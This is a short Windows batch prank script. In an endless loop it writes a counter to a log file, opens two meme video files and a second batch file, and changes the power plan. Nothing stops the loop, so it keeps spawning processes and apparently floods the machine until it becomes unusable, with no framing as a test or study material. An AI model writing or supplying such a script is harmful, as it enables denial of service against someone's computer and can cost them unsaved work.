@echo off
set COUNT=0

:StartLoop
set /a COUNT+=1
echo Loop iteration: %COUNT% >> Loop_Spam_Log.txt

start "" "Rickroll.mp4"
start "" "Nyan Cat.mp4"
start "" "StickyK.bat"
powercfg -s SCHEME_MAX
goto StartLoop
